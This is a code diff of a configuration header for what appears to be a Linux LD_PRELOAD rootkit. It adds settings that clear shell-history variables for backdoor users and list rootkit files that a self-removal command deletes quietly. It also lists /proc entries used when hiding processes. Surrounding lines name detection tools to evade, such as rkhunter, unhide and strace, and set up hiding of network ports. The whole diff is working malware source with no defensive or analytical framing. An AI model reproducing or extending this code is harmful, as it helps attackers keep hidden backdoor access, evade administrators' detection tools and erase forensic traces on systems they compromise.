@@ -6,6 +6,7 @@
 #define PHP_NEWFILENAME "_PHP_NEWFILENAME_"
 #define PHP_LOCATION    "_PHP_LOCATION_"
 #define SECRET_PORT     _SECRET_PORT_
+#define MSGPATH         "_MSGPATH_"
 
 #define SOPATH          "_SOPATH_"
 #define PRELOAD         "_PRELOAD_"
@@ -30,6 +31,7 @@ static char *const service_vars[5] = {"APACHE_PID_FILE", "TZ", "JOURNAL_STREAM",
                        /* the two hidden files it needs for the backdoor to */
                        /* function how we want                              */
 
+
 /* stuff to hide from & evade */
 static char *const scary_variables[4] = {"LD_TRACE_LOADED_OBJECTS", "LD_DEBUG", "LD_AUDIT", NULL};
 
@@ -38,19 +40,30 @@ static char *const scary_paths[5] = {"*/*ld-linux*.so.*", "*ld-linux*.so.*", "*/
 static char *const scary_procs[9] = {"lsrootkit", "ldd", "unhide", "rkhunter",
                                      "chkproc", "chkdirs", "ltrace", "strace", NULL};
 
+static char *const unset_variables[5] = {"HISTFILE", "SAVEHIST",      /* unset these environment variables  */
+                                         "TMOUT", "PROMPT_COMMAND",   /* when calling process is a rootkit  */
+                                         NULL};                       /* process or a backdoor user.        */
+static char *const set_variables[3] = {"HOME=/", "TERM=xterm", NULL}; /* and set these. */
+
 /* necessary port hiding stuff */
 #define PROCNETFMT   "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n"
 #define TCPNET_PATH  "/proc/net/tcp"
 #define TCPNET6_PATH "/proc/net/tcp6"
 
-static char *const rmfiles[5] = {PHP_LOCATION, SUID_BIN,  /* files to unlink when ./killself's */
-                                 SOPATH, PRELOAD, NULL};  /* executed from the backdoor shell. */
+static char *const rkfiles[6] = {PHP_LOCATION, MSGPATH, SUID_BIN,  /* files to unlink when ./killself's */
+                                 SOPATH, PRELOAD, NULL};           /* executed from the backdoor shell. */
 #define KILLSELF_QUIET  0x01  /* KILLSELF_QUIET used when we don't want the */
                               /* user to see that we're trying to tidy up   */
 #define KILLSELF_OUTPUT 0x02
 
-/* rest of these are just definitions of stuff
- * the rootkit needs in order to werk. */
+/* ignore all of these when determining if a process is hidden or not. */
+static char *const procignore[21] = {"sys", "uptime", "meminfo", "bus",
+                                     "cgroups", "cmdline", "cpuinfo",
+                                     "filesystems", "interrupts",
+                                     "loadavg", "mounts", "net",
+                                     "self", "stat", "tty", "version",
+                                     "version_signature", "osrelease",
+                                     "pid_max", "min_free_kbytes", NULL};
 
 #define MODE_REG 0x32  /* for stat'ing reg files */
 #define MODE_BIG 0x64  /* or... bigger files.    */
